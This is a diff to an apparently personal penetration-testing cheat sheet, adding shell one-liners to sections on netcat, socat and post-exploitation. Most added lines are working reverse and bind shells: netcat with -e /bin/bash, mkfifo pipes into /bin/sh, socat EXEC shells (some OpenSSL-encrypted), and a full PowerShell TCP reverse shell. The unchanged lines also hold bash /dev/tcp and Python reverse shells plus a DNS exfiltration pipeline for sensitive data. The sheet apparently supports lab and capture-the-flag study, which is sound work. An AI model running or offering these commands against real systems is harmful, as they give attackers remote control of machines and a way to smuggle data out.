@@ -9,8 +9,6 @@ nmap -O --osscan-guess [target] # Attempt to Guess an Unknown OS
 nmap -sV [target] # Service Version Detection
 nmap -sV --script=banner $ip # Banner Grabbing
 
-
-
 # Nmap: More Complex
 nmap -sC -sV -oN normal.txt target-ip # Enumerate services and use default scripts
 nmap -p- -oN all_ports.txt target-ip # Scan all tcp ports
@@ -44,9 +42,40 @@ openssl s_client -connect <IP_address>:443 # Check SSL Certificate
 # netcat
 # ======
 
-nc -l -p 567 # netcat listening on tcp port 567
+nc -lvnp 567 # netcat listening on tcp port 567
 nc 1.2.3.4 5676 # Connecting to that port from another machine
 nc -lvp 8080 > /tmp/creds.data # Recieve data on port 8080 and pipe it to creds.data
+nc <LOCAL-IP> <PORT> -e /bin/bash # Execute on target machine to connect back to revhsell
+nc -lvnp <port> -e "cmd.exe" # Bind shell on target
+nc MACHINE_IP <port> # Once opened up, connect on that port
+sudo rlwrap nc -lvnp 443
+mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f # Creating a bind shell listener
+mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f # Send a netcat reverse shell
+
+# =====
+# socat
+# =====
+socat TCP-L:<port> - # Revshell Listener
+socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes # Execute on windows target to connect back to revshell (The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.)
+socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li" # Execute on Linux target to connect back to revshell
+socat TCP-L:<PORT> EXEC:"bash -li" # Execute on Linux target for bind shell
+socat TCP-L:<PORT> EXEC:powershell.exe,pipes # Executre Windows target for bind shell
+socat TCP:<TARGET-IP>:<TARGET-PORT> - # Connect on port opened up with bind shell
+
+# Trying to get a fully stable revshell on Linux with Socat
+socat TCP-L:<port> FILE:`tty`,raw,echo=0 # Listener
+socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane # Connect back to listener
+
+# Socat Encrypted RevShell
+openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt # Generate certificate 
+cat shell.key shell.crt > shell.pem # Merge the key and certicate into a .pem file
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 - # Setup an OpenSSL Listener. NOTE: verify=0 tells the connection to not bother validating the certificate. The certificate must be used on whichever device is listening.
+socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash # Connect back to listener
+
+# Socat Encrypted Bind Shell
+socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes # Open a listener on the target
+socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 - # Connect to that listener from your machine
+
 
 # =====
 # Hydra
@@ -96,8 +125,8 @@ nmap -sV -p <port_number> <hostname or IP address>
 bash -c 'sh -i >& /dev/tcp/<Attackers-IP>/<Listening-Port> 0>&1' # RevShell with Bash (Newer Linux Distros)
 # Python RevShell
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<LHOST>",<LPORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
-
-
+export TERM=xterm # Gain terminal commands such as "clear" etc...
+stty raw -echo; fg # Turns off terminal echo and allows ctrl+c for killing processes
 
 # =======
 # davtest
@@ -176,8 +205,7 @@ cat sensitive_data.txt | base64 | tr -d "\n" | fold -w18 | sed 's/.*/&./' | tr -
 echo "TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com." | cut -d"." -f1-8 | tr -d "." | base64 -d
 nmap -p 80 --script http-headers $ip # Banner Grabbing
 responder -I ens5 # Responder to create an SMB listener
-
-
+powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"# Powershell RevShell One-Liner
 
 
 
